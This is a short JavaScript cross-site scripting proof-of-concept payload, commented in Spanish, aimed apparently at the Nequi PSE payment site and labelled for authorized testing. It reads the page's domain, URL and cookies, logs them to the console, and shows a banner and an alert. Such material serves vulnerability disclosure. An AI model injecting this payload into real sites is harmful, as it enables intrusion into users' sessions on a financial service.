// PoC XSS - Nequi PSE
// Solo para pruebas de seguridad autorizadas

(function() {
    var domain = document.domain;
    var cookies = document.cookie;
    var url = window.location.href;

    // 1. Log en consola
    console.log('=================================');
    console.log('[POC] XSS ejecutado exitosamente');
    console.log('[POC] Dominio:', domain);
    console.log('[POC] URL:', url);
    console.log('[POC] Cookies:', cookies || 'No accesibles');
    console.log('=================================');

    // 2. Banner visual
    var banner = document.createElement('div');
    banner.id = 'xss-poc-banner';
    banner.innerHTML = '<strong>⚠️ POC XSS - Dominio: ' + domain + '</strong>';
    banner.style.cssText = 'position:fixed;top:0;left:0;right:0;background:#ff0040;color:#fff;padding:15px;text-align:center;font-family:monospace;font-size:16px;z-index:999999;';
    document.body.appendChild(banner);

    // 3. Alert de confirmacion
    alert('XSS Confirmado en: ' + domain);
})();
